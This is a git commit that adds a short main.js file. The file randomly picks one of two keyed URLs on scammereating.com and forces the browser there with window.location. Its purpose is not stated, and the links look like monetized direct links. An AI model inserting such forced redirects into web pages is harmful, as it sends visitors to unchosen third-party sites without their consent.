e373e84aaceb27e542d25b620c05581ca00d0655
itsmeplayfj <94605694+itsmeplayfj@users.noreply.github.com>
2021-12-18 08:06:00 +0800

    Create main.js

---
+++ main.js
@@ -0,0 +1,6 @@
+var dataUrl = [
+'//scammereating.com/h8ad994p3g?key=68c6e7dbd635523b65529770d75dbac1',
+'https://scammereating.com/sak2q36acm?key=6ed8eb6671883f3fef32e7207e19388f'
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
